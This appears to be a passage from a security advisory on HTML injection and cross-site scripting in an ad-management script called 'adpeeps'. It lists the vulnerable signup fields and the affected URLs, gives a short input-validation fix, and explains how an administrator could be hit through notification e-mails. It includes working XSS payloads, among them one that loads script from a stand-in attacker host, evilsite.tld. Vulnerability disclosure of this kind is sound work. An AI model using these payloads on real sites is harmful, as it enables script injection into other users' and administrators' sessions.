-- The Cross Site Scripting will most likely not survive any logins from what our research results showed.

Affected Fields in the Signup Formular by HTML Injection:
- Advertiser Name
- First Name
- Last Name
- *Advertiser E-Mail
- Address
- Phone Number
- Password Hint
- URL to goto on click
*Was not tested but might be vulnerable.

Avoid HTML Injection In: (these fields gets sent to the administrator by e-mail)
Advertiser Name
First & Last Name
Advertiser E-mail

HTML Injection: : (insert: "><script>alert(0)</script> into the mentioned forms)
http://www.website.tld/adpeeps/index.php?loc=view_adrates&uid=100000
- One will have to buy a user / ad-spot in order to exploit this issue.

Affected Sites by HTML Injection: (where Advertiser Name, First- and Last-name isn't used)

http://www.website.tld/adpeeps/index.php?loc=view_campaign_stats&uid=100000&campaignid=VALIDID

Affected Sites by HTML Injection: (which requires abnormal injection. (the common alert(0) did not work))
http://www.website.tld/adpeeps/index.php?loc=createcampaign&mode=edit&uid=100000&campaignid=VALIDID (first- and/or last-name)
http://www.website.tld/adpeeps/index.php?loc=email_advertisers&uid=100000&mode=1&errors=&from=&message=&subject= (first- and/or last-name)
http://www.website.tld/adpeeps/index.php?loc=createcampaign&mode=edit&uid=100000&campaignid=VALIDID (first- and/or last-name)
http://www.website.tld/adpeeps/index.php?loc=view_campaign_stats&uid=100000&campaignid=VALIDID (first- and/or last-name)
The above "abnormal" injection we tested with was: "></td></tr></table><SCRIPT SRC=http://evilsite.tld/xss.js></SCRIPT><!--


-:: Solution ::-
The most easy solution is to validate user input and strip or convert
bad / html characters.

Conclusion:
Even if One decides to (ab)use the Advertiser Name, First- and
Last-name's as injection points and the administrator sees this (in an
e-mail), then he will still be affected by the injection and possibly
have a hard time deleting those malicious users safely except if he
might have NoScript turned on for his own website. (the injection points
might render the desired pages useless)
